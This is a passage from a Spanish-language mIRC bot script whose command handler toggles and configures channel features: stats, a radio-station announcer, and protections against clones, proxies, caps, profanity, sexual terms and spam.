            if (%Stats.status.auto. [ $+ [ %canaldestinoMSG ] ]) { .timerStats.auto. $+ %canaldestinoMSG 1 $calc(%Stats.status.auto. [ $+ [ %canaldestinoMSG ] ] * 60) statsmirc.auto %canaldestinoMSG }
          }
          halt
        }
        if ($strip($3) == OFF) {
          if (%Stats.status. [ $+ [ %canaldestinoMSG ] ]) { unset %Stats.status. [ $+ [ %canaldestinoMSG ] ] | .timerstats.auto. $+ %canaldestinoMSG off | msg %msgdestino 2Stats2 DesActivadas. }
          else { msg %msgdestino 2ERROR:2 Las Stats no estan Activadas. }
          halt
        }
        if ($strip($3) == MUESTRAWEB) {
          if ($strip($4) == ON) {
            if (%Stats.MWeb. [ $+ [ %canaldestinoMSG ] ] == $null) { msg %msgdestino 2ERROR:2 Ya se muestra la Web al actualizarse las Stats. }
            else { unset %Stats.MWeb. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Stats2 Se mostrara la Web al actualizarse las Stats. }
            halt
          }
          if ($strip($4) == OFF) {
            if (%Stats.MWeb. [ $+ [ %canaldestinoMSG ] ] == $null) { set %Stats.MWeb. $+ %canaldestinoMSG o | msg %msgdestino 2Stats2 No se mostrara la Web al actualizarse las Stats. }
            else { msg %msgdestino 2ERROR:2 Ya no se muestra la Web al actualizarse las Stats. }
            halt
          }
          msg %msgdestino 2Error2: Especifique una de las opciones, STATS MUESTRAWEB ON\OFF | halt
        }
        if ($strip($3) == AUTO) {
          if (%Stats.status. [ $+ [ %canaldestinoMSG ] ] == $null) { msg %msgdestino 2ERROR:2 Las Stats no estan activadas. | halt }
          if ($strip($4) == ON) {
            if (%Stats.status.auto. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya se actualizan automaticamente a los12 %Stats.status.auto. [ $+ [ %canaldestinoMSG ] ] 2minutos. }
            else {
              if (0 > $strip($5)) || (+ isin $strip($5)) || (- isin $strip($5)) || ($strip($5) !isnum) { msg %msgdestino 2ERROR:2 Sintaxis: STATS AUTO ON <MINUTOS> | halt }
              set %Stats.status.auto. $+ %canaldestinoMSG $strip($5) | .timerStats.auto. $+ %canaldestinoMSG 1 $calc($strip($5) * 60) statsmirc.auto %canaldestinoMSG
              msg %msgdestino 2Stats2 Se actualizaran automaticamente cada12 %Stats.status.auto. [ $+ [ %canaldestinoMSG ] ] 2minutos.
            }
            halt
          }
          if ($strip($4) == OFF) {
            if (%Stats.status.auto. [ $+ [ %canaldestinoMSG ] ]) { unset %Stats.status.auto. [ $+ [ %canaldestinoMSG ] ] | .timerStats.auto. $+ %canaldestinoMSG off | msg %msgdestino 2Stats2 No se actualizaran de forma automatica. }
            else { msg %msgdestino 2ERROR:2 Ya no se actualizaba de forma automatica. }
            halt
          }
          msg %msgdestino 2Error2: Especifique una de las opciones, STATS AUTO ON\OFF [Minutos] | halt
        }
        msg %msgdestino 2Error2: Especifique una de las opciones, STATS ON\OFF\ACTUALIZA\AUTO\RESET\FUERZA\MUESTRAWEB
      }
      if ($strip($2) == ASALUDO.CANAL) {
        if ($strip($3) == ON) {
          if (%ASALUDO.CANAL. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activado el comando ASALUDO.CANAL2. }
          else { set %ASALUDO.CANAL. $+ %canaldestinoMSG o | msg %msgdestino 2Comando2 ASALUDO.CANAL 2Activado. }
          halt
        }
        if ($strip($3) == OFF) {
          if (%ASALUDO.CANAL. [ $+ [ %canaldestinoMSG ] ]) {
            unset %ASALUDO.CANAL. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2Comando2 ASALUDO.CANAL2 DesActivado.
          }
          else { msg %msgdestino 2ERROR:2 El comando ASALUDO.CANAL no esta activado para poderlo desactivar. }
          halt
        } 
        msg %msgdestino 2Error2: Especifique el estado, ASALUDO.CANAL ON\OFF
      }
      if ($strip($2) == EMISORA) {
        if ($strip($3) == ON) {
          if (%emisora.sg == $null) || (%emisora.port == $null) || (%emisora.ipm == $null) || (%emisora.ip == $null) { msg %msgdestino 2ERROR:2 Para activar la emisora configure los par·metros. | halt }
          if (%emisora.st) { msg %msgdestino 2ERROR:2 Ya est· activada la EMISORA2. }
          else { unset %lines.chan-* | set %norepit.all.a o | set %emisora.st o | datv-emisora | emon.is | msg %msgdestino 2EMISORA 2Activada. }
          halt
        }
        if ($strip($3) == OFF) {
          if (%emisora.st) { unset %emisora.st %emisorap* %lines.chan-* %norepit.all.a | .timeremon.is off | datv-emisora | msg %msgdestino 2EMISORA2 DesActivada. }
          else { msg %msgdestino 2ERROR:2 La EMISORA no esta activada para poderla desactivar. }
          halt
        }
        if ($strip($3) == SEGS) {
          if (%emisora.st) { msg %msgdestino 2ERROR:2 Debes desactivar la emisora para cambiar la configuraciÛn. | halt }
          elseif ($strip($4)) {
            if ($strip($4) !isnum) || (- isin $strip($4)) || (+ isin $strip($4)) { msg %msgdestino 2ERROR:2 EMISORA SEGS: Los segundos tienen que ser numeros. | halt }
            set %emisora.sg $strip($4) | datv-emisora | msg %msgdestino 2EMISORA SEGS2: ConfiguraciÛn cambiada a12 $strip($4) $+ 2segs. | halt
          }
          msg %msgdestino 2Error2: Especifique los segundos, EMISORA SEGS <SEGUNDOS>
          halt
        }
        if ($strip($3) == PORT) {
          if (%emisora.st) { msg %msgdestino 2ERROR:2 Debes desactivar la emisora para cambiar la configuraciÛn. | halt }
          elseif ($strip($4)) {
            if ($strip($4) !isnum) || (- isin $strip($4)) || (+ isin $strip($4)) { msg %msgdestino 2ERROR:2 EMISORA PORT: El puerto tienen que ser numeros. | halt }
            set %emisora.port $strip($4) | datv-emisora | msg %msgdestino 2EMISORA PORT2: Puerto cambiado a:12 $strip($4) $+ 2. | halt
          }
          msg %msgdestino 2Error2: Especifique el puerto, EMISORA PORT <PUERTO>
          halt
        }
        if ($strip($3) == IP) {
          if (%emisora.st) { msg %msgdestino 2ERROR:2 Debes desactivar la emisora para cambiar la configuraciÛn. | halt }
          elseif ($strip($4)) {
            set %emisora.ip $strip($4) | datv-emisora | msg %msgdestino 2EMISORA IP2: DirecciÛn IP cambiada a:12 $strip($4) $+ 2. | halt
          }
          msg %msgdestino 2Error2: Especifique el puerto, EMISORA IP <IP>
          halt
        }
        if ($strip($3) == IPM) {
          if (%emisora.st) { msg %msgdestino 2ERROR:2 Debes desactivar la emisora para cambiar la configuraciÛn. | halt }
          elseif ($strip($4)) {
            set %emisora.ipm $strip($4) | datv-emisora | msg %msgdestino 2EMISORA IPM2: DirecciÛn IP a mostrar cambiada a:12 $strip($4) $+ 2. | halt
          }
          msg %msgdestino 2Error2: Especifique el puerto, EMISORA IPM <IP a mostrar>
          halt
        }
        if ($strip($3) == OYENTES) {
          if ($strip($4) == SI) || ($strip($4) == NO) {
            if ($strip($4) == SI) { unset %emisora.moyent | msg %msgdestino 2EMISORA OYENTES2: Se mostraran los OYENTES. }
            else { set %emisora.moyent n | msg %msgdestino 2EMISORA OYENTES2: No se mostraran los OYENTES. }
            halt
          }
          msg %msgdestino 2Error2: Especifique el estado: si quieres que diga los oyentes, EMISORA OYENTES <SI\NO>
          halt
        }
        if ($strip($3) == VELOCIDAD) {
          if ($strip($4) == SI) || ($strip($4) == NO) {
            if ($strip($4) == SI) { unset %emisora.mvelocid | msg %msgdestino 2EMISORA VELOCIDAD2: Se mostrara la Velocidad. }
            else { set %emisora.mvelocid n | msg %msgdestino 2EMISORA VELOCIDAD2: No se mostrara la Velocidad. }
            halt
          }
          msg %msgdestino 2Error2: Especifique el estado: si quieres que diga la velocidad, EMISORA VELOCIDAD <SI\NO>
          halt
        }
        if ($strip($3) == GENERO) {
          if ($strip($4) == SI) || ($strip($4) == NO) {
            if ($strip($4) == SI) { unset %emisora.GENERO | msg %msgdestino 2EMISORA GENERO2: Se mostrara el Genero. }
            else { set %emisora.GENERO n | msg %msgdestino 2EMISORA GENERO2: No se mostrara el Genero. }
            halt
          }
          msg %msgdestino 2Error2: Especifique el estado: si quieres que diga el genero, EMISORA GENERO <SI\NO>
          halt
        }
        if ($strip($3) == NOMBRE) {
          if (!$strip($4)) { msg %msgdestino 2Error2: Especifique el nombre de la Radio, EMISORA NOMBRE <NOMBRE RADIO> | halt }
          set %emisora.nombre $strip($4-) | msg %msgdestino 2EMISORA2 El nombre de la Radio se ha cambiado por: $strip($4-) | halt
        }
        msg %msgdestino 2Error2: Especifique los par·metros, EMISORA ON\OFF\SEGS\PORT\IP\IPM\OYENTES\VELOCIDAD\GENERO\NOMBRE
      }
      if ($strip($2) == ANTICLONES) {
        if ($strip($3) == ON) {
          if (0 >= $iif($strip($4) !isnum,0,$strip($4))) { msg %msgdestino 2ERROR:2 Sintaxis: ANTICLONES ON\OFF <Numero de clones permitidos> | halt }
          if (%ANTICLONES. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn ANTICLONES2 con12 $ifmatch 2clones permitidos por ipv. }
          else { set %ANTICLONES. $+ %canaldestinoMSG $abs($strip($4)) | msg %msgdestino 2ProtecciÛn2 ANTICLONES2 2Activado, solo se permitiran12 $abs($strip($4)) $+ 2 clones por ipv. }
          halt
        }
        if ($strip($3) == OFF) {
          if (%ANTICLONES. [ $+ [ %canaldestinoMSG ] ]) {
            unset %ANTICLONES. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 ANTICLONES2 DesActivado.
          }
          else { msg %msgdestino 2ERROR:2 La protecciÛn ANTICLONES no est· activada para poderla desactivar. }
          halt
        } 
        msg %msgdestino 2Error2: Especifique el estado, ANTICLONES ON\OFF <Numero de clones permitidos>

      }
      if ($strip($2) == ANTIPROXYS) {
        if ($strip($3) == ON) {
          if (%ANTIPROXYS. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn ANTIPROXYS2. }
          else { set %ANTIPROXYS. $+ %canaldestinoMSG o | msg %msgdestino 2ProtecciÛn2 ANTIPROXYS2 2Activado. }
          halt
        }
        if ($strip($3) == OFF) {
          if (%ANTIPROXYS. [ $+ [ %canaldestinoMSG ] ]) {
            unset %ANTIPROXYS. [ $+ [ %canaldestinoMSG ] ] | .timerPROX- $+ %canaldestinoMSG $+ -* off | .timer-rm- $+ %canaldestinoMSG off | msg %msgdestino 2ProtecciÛn2 ANTIPROXYS2 DesActivado.
          }
          else { msg %msgdestino 2ERROR:2 La protecciÛn ANTIPROXYS no est· activada para poderla desactivar. }
          halt
        } 
        msg %msgdestino 2Error2: Especifique el estado, ANTIPROXYS ON\OFF
      }
      if ($strip($2) == ANTITELEFONOS) {
        if ($strip($3) == ON) {
          if (%ANTITELEFONOS. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn AntiTelefonos2. }
          else { set %ANTITELEFONOS. $+ %canaldestinoMSG o | msg %msgdestino 2ProtecciÛn2 AntiTelefonos2 2Activado. }
          halt
        }
        if ($strip($3) == OFF) {
          if (%ANTITELEFONOS. [ $+ [ %canaldestinoMSG ] ]) { unset %ANTITELEFONOS. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 AntiTelefonos2 DesActivado. }
          else { msg %msgdestino 2ERROR:2 La protecciÛn AntiTelefonos no esta activada para poderla desactivar. }
          halt
        }
        if ($strip($3) == MSG.KICK) {
          if ($4 == $null) { msg %msgdestino 2AntiTelefonos2 Se ha restablecido el mensaje del kick por defecto. | unset %MSG.KICK.AntiTelefonos. [ $+ [ %canaldestinoMSG ] ] }
          else { set %MSG.KICK.AntiTelefonos. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiTelefonos2 Se ha cambiado el mensaje del kick por: $4- }
          halt
        }
        msg %msgdestino 2Error2: Sintaxis:2 AntiTelefonos ON\OFF\MSG.KICK [Mensaje del ban-kick]
      }
      if ($strip($2) == AUTOLIMIT) {
        if ($strip($3) == ON) {
          if (%AUTOLIMIT. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn AUTOLIMIT2. }
          else {
            set %AUTOLIMIT. $+ %canaldestinoMSG o
            if ($me isop %canaldestinoMSG) { mode %canaldestinoMSG +l $calc($nick(%canaldestinoMSG,0) + 5) }
            msg %msgdestino 2ProtecciÛn2 AUTOLIMIT2 2Activado.
          }
          halt
        }
        if ($strip($3) == OFF) {
          if (%AUTOLIMIT. [ $+ [ %canaldestinoMSG ] ]) {
            if ($me isop %canaldestinoMSG) { mode %canaldestinoMSG -l }
            unset %AUTOLIMIT. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 AUTOLIMIT2 DesActivado.
          }
          else { msg %msgdestino 2ERROR:2 La protecciÛn AUTOLIMIT no esta activada para poderla desactivar. }
          halt
        } 
        msg %msgdestino 2Error2: Especifique el estado, AUTOLIMIT ON\OFF
      }
      if ($strip($2) == ANTIMAYUS) {
        if ($strip($3) == ON) {
          if ($remove($strip($4),%) isnum) && (99 >= $remove($strip($4),%)) && ($remove($strip($4),%) >= 1) {
            if (%antimayus. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn ANTIMAYUS2. }
            else { set %antimayus. $+ %canaldestinoMSG $remove($strip($4),%) | msg %msgdestino 2ProtecciÛn2 ANTIMAYUS2 2Activado. }
            halt
          }
        }
        if ($strip($3) == OFF) {
          if (%antimayus. [ $+ [ %canaldestinoMSG ] ]) { unset %antimayus. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 ANTIMAYUS2 DesActivado. }
          else { msg %msgdestino 2ERROR:2 La protecciÛn ANTIMAYUS no esta activada para poderla desactivar. }
          halt
        }
        if ($strip($3) == AVISOS) {
          if ($strip($4) isnum) && (+ !isin $4) && (- !isin $4) { set %AVISOS.antimayus. [ $+ [ %canaldestinoMSG ] ] $strip($4) | msg %msgdestino 2ANTIMAYUS2: N∫ de avisos fijado en12 $strip($4) $+ . }
          else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTIMAYUS AVISOS <NUMERO> }
          halt
        }
        if ($strip($3) == MSG.AVISO) {
          if ($4 == $null) { msg %msgdestino 2AntiMayus2 Se ha restablecido el mensaje de aviso por defecto. | unset %MSG.AVISO.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ] }
          else { set %MSG.AVISO.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiMayus2 Se ha cambiado el mensaje de aviso por: $4- }
          halt
        }
        if ($strip($3) == MSG.KICK) {
          if ($4 == $null) { msg %msgdestino 2AntiMayus2 Se ha restablecido el mensaje del kick por defecto. | unset %MSG.KICK.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ] }
          else { set %MSG.KICK.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiMayus2 Se ha cambiado el mensaje del kick por: $4- }
          halt
        }
        if ($strip($3) == ESTADO) {
          msg %msgdestino 2Estado de ANTIMAYUS Mensaje AVISOS: $iif(%MSG.AVISO.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ] != $null,%MSG.AVISO.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ],°Desactiva las may˙sculas!) Mensaje de KICKs: $iif(%MSG.KICK.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ] != $null,%MSG.KICK.ANTIMAYUS. [ $+ [ %canaldestinoMSG ] ],Desactiva las may˙sculas) | halt
        }
        msg %msgdestino 2Error2: Especifique el estado, ANTIMAYUS ON\OFF\AVISOS\MSG.AVISO\MSG.KICK\ESTADO <%> -> El % debe ser entre el 1 y 99.
      }
      if ($strip($2) == ANTIPALABROTAS) {
        if ($strip($3) != add) && ($strip($3) != del) && ($strip($3) != list) && ($strip($3) != ON) && ($strip($3) != OFF) && ($strip($3) != AVISOS) && ($strip($3) != MSG.AVISO) && ($strip($3) != MSG.KICK) { msg %msgdestino 2ERROR:2 Sintaxis: ANTIPALABROTAS ON\OFF\ADD\DEL\LIST\AVISOS\MSG.AVISO\MSG.KICK }
        else {
          if ($strip($3) == MSG.AVISO) {
            if ($4 == $null) { msg %msgdestino 2AntiPalabrotas2 Se ha restablecido el mensaje de aviso por defecto. | unset %MSG.AVISO.ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ] }
            else { set %MSG.AVISO.ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiPalabrotas2 Se ha cambiado el mensaje de aviso por: $4- }
          }
          if ($strip($3) == MSG.KICK) {
            if ($4 == $null) { msg %msgdestino 2AntiPalabrotas2 Se ha restablecido el mensaje del kick por defecto. | unset %MSG.KICK.ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ] }
            else { set %MSG.KICK.ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2AntiPalabrotas2 Se ha cambiado el mensaje del kick por: $4- }
          }
          if ($strip($3) == LIST) {
            %ANTIPALABROTAS.list2 = %rHcN $+ ANTIPALABROTAS- $+ %canaldestinoMSG $+ .txt
            if ($lines(%ANTIPALABROTAS.list2) == 0) { msg %msgdestino 2Error2: La lista de 2ANTIPALABROTAS2 esta vacia. }
            else {
              unset %ANTIPALABROTAS.listi %ANTIPALABROTAS.list3
              msg %msgdestino 2La lista de 2ANTIPALABROTAS2 contiene12 $lines(%ANTIPALABROTAS.list2) 2palabras:
              var %linesANTIPALABROTAS $lines(%ANTIPALABROTAS.list2)
              .fopen ANTIPALABROTAS- $+ %canaldestinoMSG %ANTIPALABROTAS.list2
              while (!$feof) && (!$ferr) {
                var %ANTIPALABROTAS.lread $fread(ANTIPALABROTAS- $+ %canaldestinoMSG)
                var %ANTIPALABROTAS.2read $fread(ANTIPALABROTAS- $+ %canaldestinoMSG)
                var %ANTIPALABROTAS.3read $fread(ANTIPALABROTAS- $+ %canaldestinoMSG)
                var %ANTIPALABROTAS.4read $fread(ANTIPALABROTAS- $+ %canaldestinoMSG)
                var %ANTIPALABROTAS.5read $fread(ANTIPALABROTAS- $+ %canaldestinoMSG)
                var %ANTIPALABROTAS.6read $fread(ANTIPALABROTAS- $+ %canaldestinoMSG)
                inc %ANTIPALABROTAS.listi 6
                set %ANTIPALABROTAS.list4 12 $+ $iif(%ANTIPALABROTAS.lread,%ANTIPALABROTAS.lread $+ 2 $chr(44) $+ 12) $+ $iif(%ANTIPALABROTAS.2read,%ANTIPALABROTAS.2read $+ 2 $chr(44) $+ 12) $+ $iif(%ANTIPALABROTAS.3read,%ANTIPALABROTAS.3read $+ 2 $chr(44) $+ 12) $+ $iif(%ANTIPALABROTAS.4read,%ANTIPALABROTAS.4read $+ 2 $chr(44) $+ 12) $+ $iif(%ANTIPALABROTAS.5read,%ANTIPALABROTAS.5read $+ 2 $chr(44)) $+ 12 $+ %ANTIPALABROTAS.6read $+ 
                if (%ANTIPALABROTAS.listi >= %linesANTIPALABROTAS) {
                  if ($strip($gettok(%ANTIPALABROTAS.list4,$gettok(%ANTIPALABROTAS.list4,0,32),32)) == $chr(44)) { set %ANTIPALABROTAS.list4 $gettok(%ANTIPALABROTAS.list4,1- $+ $calc($gettok(%ANTIPALABROTAS.list4,0,32) - 1),32) $+ 2. }
                  else { set %ANTIPALABROTAS.list4 %ANTIPALABROTAS.list4 $+ 2. }
                }
                inc %ANTIPALABROTAS.list3 4 | .timerANTIPALABROTASlist- $+ %msgdestino $+ %ANTIPALABROTAS.list3 1 %ANTIPALABROTAS.list3 msg %msgdestino %ANTIPALABROTAS.list4
              }
              .fclose ANTIPALABROTAS- $+ %canaldestinoMSG
            }
          }
          if ($strip($3) == ON) {
            if (%ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn ANTIPALABROTAS2. }
            else { set %ANTIPALABROTAS. $+ %canaldestinoMSG on | msg %msgdestino 2ProtecciÛn2 ANTIPALABROTAS2 2Activada. }
          }
          if ($strip($3) == OFF) {
            if (%ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ]) { unset %ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 ANTIPALABROTAS2 DesActivada. }
            else { msg %msgdestino 2ERROR:2 La protecciÛn ANTIPALABROTAS no esta activada para poderla desactivar. }
          }
          if ($strip($3) == ADD) {
            if ($strip($4)) {
              if ($ANTIPALABROTAS.add(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2ANTIPALABROTAS2: La palabra:12 $strip($4) 2ha sido agregada. | halt }
              else { msg %msgdestino 2Error:2 ANTIPALABROTAS: La palabra:12 $strip($4) 2ya existe. | halt }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTIPALABROTAS ADD <PALABRA> }
          }
          if ($strip($3) == AVISOS) {
            if ($strip($4) isnum) && (+ !isin $4) && (- !isin $4) { set %AVISOS.ANTIPALABROTAS. [ $+ [ %canaldestinoMSG ] ] $strip($4) | msg %msgdestino 2ANTIPALABROTAS2: N∫ de avisos fijado en12 $strip($4) $+ . }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTIPALABROTAS AVISOS <NUMERO> }
          }
          if ($strip($3) == DEL) {
            if ($strip($4)) {
              if ($ANTIPALABROTAS.del(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2ANTIPALABROTAS2: La palabra:12 $strip($4) 2ha sido eliminada. }
              else { msg %msgdestino 2Error:2 ANTIPALABROTAS: La palabra:12 $strip($4) 2no existe. }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTIPALABROTAS DEL <PALABRA> }
          }
        }
      }
      if ($strip($2) == ANTISEXO) {
        if ($strip($3) != add) && ($strip($3) != del) && ($strip($3) != list) && ($strip($3) != ON) && ($strip($3) != OFF) && ($strip($3) != AVISOS) && ($strip($3) != MSG.AVISO) && ($strip($3) != MSG.KICK) { msg %msgdestino 2ERROR:2 Sintaxis: ANTISEXO ON\OFF\ADD\DEL\LIST\AVISOS\MSG.AVISO\MSG.KICK }
        else {
          if ($strip($3) == MSG.AVISO) {
            if ($4 == $null) { msg %msgdestino 2ANTISEXO2 Se ha restablecido el mensaje de aviso por defecto. | unset %MSG.AVISO.ANTISEXO. [ $+ [ %canaldestinoMSG ] ] }
            else { set %MSG.AVISO.ANTISEXO. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2ANTISEXO2 Se ha cambiado el mensaje de aviso por: $4- }
          }
          if ($strip($3) == MSG.KICK) {
            if ($4 == $null) { msg %msgdestino 2ANTISEXO2 Se ha restablecido el mensaje del kick por defecto. | unset %MSG.KICK.ANTISEXO. [ $+ [ %canaldestinoMSG ] ] }
            else { set %MSG.KICK.ANTISEXO. [ $+ [ %canaldestinoMSG ] ] $4- | msg %msgdestino 2ANTISEXO2 Se ha cambiado el mensaje del kick por: $4- }
          }
          if ($strip($3) == LIST) {
            %ANTISEXO.list2 = %rHcN $+ ANTISEXO- $+ %canaldestinoMSG $+ .txt
            if ($lines(%ANTISEXO.list2) == 0) { msg %msgdestino 2Error2: La lista de 2ANTISEXO2 esta vacia. }
            else {
              unset %ANTISEXO.listi %ANTISEXO.list3
              msg %msgdestino 2La lista de 2ANTISEXO2 contiene12 $lines(%ANTISEXO.list2) 2palabras:
              var %linesANTISEXO $lines(%ANTISEXO.list2)
              .fopen ANTISEXO- $+ %canaldestinoMSG %ANTISEXO.list2
              while (!$feof) && (!$ferr) {
                var %ANTISEXO.lread $fread(ANTISEXO- $+ %canaldestinoMSG)
                var %ANTISEXO.2read $fread(ANTISEXO- $+ %canaldestinoMSG)
                var %ANTISEXO.3read $fread(ANTISEXO- $+ %canaldestinoMSG)
                var %ANTISEXO.4read $fread(ANTISEXO- $+ %canaldestinoMSG)
                var %ANTISEXO.5read $fread(ANTISEXO- $+ %canaldestinoMSG)
                var %ANTISEXO.6read $fread(ANTISEXO- $+ %canaldestinoMSG)
                inc %ANTISEXO.listi 6
                set %ANTISEXO.list4 12 $+ $iif(%ANTISEXO.lread,%ANTISEXO.lread $+ 2 $chr(44) $+ 12) $+ $iif(%ANTISEXO.2read,%ANTISEXO.2read $+ 2 $chr(44) $+ 12) $+ $iif(%ANTISEXO.3read,%ANTISEXO.3read $+ 2 $chr(44) $+ 12) $+ $iif(%ANTISEXO.4read,%ANTISEXO.4read $+ 2 $chr(44) $+ 12) $+ $iif(%ANTISEXO.5read,%ANTISEXO.5read $+ 2 $chr(44)) $+ 12 $+ %ANTISEXO.6read $+ 
                if (%ANTISEXO.listi >= %linesANTISEXO) {
                  if ($strip($gettok(%ANTISEXO.list4,$gettok(%ANTISEXO.list4,0,32),32)) == $chr(44)) { set %ANTISEXO.list4 $gettok(%ANTISEXO.list4,1- $+ $calc($gettok(%ANTISEXO.list4,0,32) - 1),32) $+ 2. }
                  else { set %ANTISEXO.list4 %ANTISEXO.list4 $+ 2. }
                }
                inc %ANTISEXO.list3 4 | .timerANTISEXOlist- $+ %msgdestino $+ %ANTISEXO.list3 1 %ANTISEXO.list3 msg %msgdestino %ANTISEXO.list4
              }
              .fclose ANTISEXO- $+ %canaldestinoMSG
            }
          }
          if ($strip($3) == ON) {
            if (%ANTISEXO. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn ANTISEXO2. }
            else { set %ANTISEXO. $+ %canaldestinoMSG on | msg %msgdestino 2ProtecciÛn2 ANTISEXO2 2Activada. }
          }
          if ($strip($3) == OFF) {
            if (%ANTISEXO. [ $+ [ %canaldestinoMSG ] ]) { unset %ANTISEXO. [ $+ [ %canaldestinoMSG ] ] | msg %msgdestino 2ProtecciÛn2 ANTISEXO2 DesActivada. }
            else { msg %msgdestino 2ERROR:2 La protecciÛn ANTISEXO no esta activada para poderla desactivar. }
          }
          if ($strip($3) == ADD) {
            if ($strip($4)) {
              if ($ANTISEXO.add(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2ANTISEXO2: La palabra:12 $strip($4) 2ha sido agregada. | halt }
              else { msg %msgdestino 2Error:2 ANTISEXO: La palabra:12 $strip($4) 2ya existe. | halt }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTISEXO ADD <PALABRA> }
          }
          if ($strip($3) == AVISOS) {
            if ($strip($4) isnum) && (+ !isin $4) && (- !isin $4) { set %AVISOS.ANTISEXO. [ $+ [ %canaldestinoMSG ] ] $strip($4) | msg %msgdestino 2ANTISEXO2: N∫ de avisos fijado en12 $strip($4) $+ . }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTISEXO AVISOS <NUMERO> }
          }
          if ($strip($3) == DEL) {
            if ($strip($4)) {
              if ($ANTISEXO.del(%canaldestinoMSG,$strip($4)) == ok) { msg %msgdestino 2ANTISEXO2: La palabra:12 $strip($4) 2ha sido eliminada. }
              else { msg %msgdestino 2Error:2 ANTISEXO: La palabra:12 $strip($4) 2no existe. }
            }
            else { msg %msgdestino 12 $+ $nick $+ 2, Sintaxis ANTISEXO DEL <PALABRA> }
          }
        }
      }
      if ($strip($2) == ANTISPAM) {
        if ($strip($3) != add) && ($strip($3) != del) && ($strip($3) != list) && ($strip($3) != ON) && ($strip($3) != OFF) { msg %msgdestino 2ERROR:2 Sintaxis: ANTISPAM ON\OFF\ADD\DEL\LIST }
        else {
          if ($strip($3) == LIST) {
            %antispam.list2 = %rHcN $+ antispam- $+ %canaldestinoMSG $+ .txt
            if ($lines(%antispam.list2) == 0) { msg %msgdestino 2Error2: La lista de 2ANTISPAM2 esta vacia. }
            else {
              unset %antispam.listi %antispam.list3
              msg %msgdestino 2La lista de 2ANTISPAM2 contiene12 $lines(%antispam.list2) 2patrones:
              var %linesantispam $lines(%antispam.list2)
              .fopen lantispam- $+ %canaldestinoMSG %antispam.list2
              while (!$feof) && (!$ferr) {
                var %antispam.lread $fread(lantispam- $+ %canaldestinoMSG)
                var %antispam.2read $fread(lantispam- $+ %canaldestinoMSG)
                var %antispam.3read $fread(lantispam- $+ %canaldestinoMSG)
                var %antispam.4read $fread(lantispam- $+ %canaldestinoMSG)
                var %antispam.5read $fread(lantispam- $+ %canaldestinoMSG)
                var %antispam.6read $fread(lantispam- $+ %canaldestinoMSG)
                inc %antispam.listi 6
                set %antispam.list4 12 $+ $iif(%antispam.lread,%antispam.lread $+ 2 $chr(44) $+ 12) $+ $iif(%antispam.2read,%antispam.2read $+ 2 $chr(44) $+ 12) $+ $iif(%antispam.3read,%antispam.3read $+ 2 $chr(44) $+ 12) $+ $iif(%antispam.4read,%antispam.4read $+ 2 $chr(44) $+ 12) $+ $iif(%antispam.5read,%antispam.5read $+ 2 $chr(44)) $+ 12 $+ %antispam.6read $+ 
                if (%antispam.listi >= %linesantispam) {
                  if ($strip($gettok(%antispam.list4,$gettok(%antispam.list4,0,32),32)) == $chr(44)) { set %antispam.list4 $gettok(%antispam.list4,1- $+ $calc($gettok(%antispam.list4,0,32) - 1),32) $+ 2. }
                  else { set %antispam.list4 %antispam.list4 $+ 2. }
                }
                inc %antispam.list3 4 | .timerantispamlist- $+ %msgdestino $+ %antispam.list3 1 %antispam.list3 msg %msgdestino %antispam.list4
              }
              .fclose lantispam- $+ %canaldestinoMSG
            }
          }
          if ($strip($3) == ON) {
            if (%antispam. [ $+ [ %canaldestinoMSG ] ]) { msg %msgdestino 2ERROR:2 Ya est· activada la protecciÛn ANTISPAM2. }
            else { set %antispam. $+ %canaldestinoMSG on | msg %msgdestino 2ProtecciÛn2 ANTISPAM2 2Activada. }
          }
          if ($strip($3) == OFF) {
